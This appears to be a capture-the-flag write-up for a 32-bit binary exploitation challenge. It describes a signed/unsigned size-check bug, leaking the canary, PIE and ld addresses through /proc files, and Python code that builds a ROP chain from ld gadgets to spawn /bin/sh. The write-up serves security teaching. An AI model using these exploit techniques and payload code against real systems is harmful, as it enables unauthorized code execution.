### Bug
* signed/unsigned comparison on read\_file size check. 

### Solution
* Leak challenge ELF by reading `/proc/self/exe` with size -1
* Reverse a bit
* Realize ROP available by reading from `/proc/self/fd/0`
* Realize we can get canary from `AT_RANDOM_addr = read_file(/proc/self/auxv)` + `read_mem(AT_RANDOM_addr)`
* Realize we can also find PIE base around `AT_RANDOM_addr`
* If more gadgets needed for rop chain (what the author did):
    - Realize we can also find an `ld` address around `AT_RANDOM_addr`
    - Leak `ld` file path by reading `/prof/self/maps` with size -1
    - Leak `ld` ELF by reading `<ld file path>` with size -1
* Construct rop chain of choice
```
    # ROP to execute SYS_execve("/bin/sh\0", NULL, NULL) using gadgets found in ld-linux.so.2
    # (edx, i.e. const char __user *const __user *envp, is already 0 (NULL))
    # Set ebx to valid memory addr in order to use the push esp gadget
        # pop ebx ; ret
    # Set ebx to pointer to "/bin/sh" on stack
        # push esp ; xor eax, eax ; mov dword ptr [ebx + 0x50], edx ; pop ebx ; pop esi ; pop edi ; ret
    # null out unused argument regs. set edi to syscall number so we can exchange it to eax
        # pop esi ; pop edi ; ret
    # exchange edi, eax to get syscall number into eax
        # xchg edi, eax ; ret
        # or
        # xchg edi, eax ; mov esi, edx ; ret
    # null out ecx (const char __user *const __user *argv) and syscall
        # xor ecx, ecx ; int 0x80
    pop_ebx             = ld_leak + 0x0000236e
    push_esp_pop_ebx    = ld_leak + 0x00023b00
    pop_esi_pop_edi     = ld_leak + 0x00023b07
    xchg_edi_eax        = ld_leak + 0x000249d2
    xor_ecx_ecx_syscall = ld_leak + 0x0001785d

    rop_chain = p32(pop_ebx) + \
                p32(bss+0x100) + \
                p32(push_esp_pop_ebx) + \
                b'/bin' + \
                b'/sh\0' + \
                p32(pop_esi_pop_edi) + \
                p32(0) + \
                p32(0xb) + \
                p32(xchg_edi_eax) + \
                p32(xor_ecx_ecx_syscall)

                                                    #randomly chosen valid ebp
    payload = pad + p32(canary) + p32(0) + p32(0) + p32(bss+0x100) + rop_chain 
```
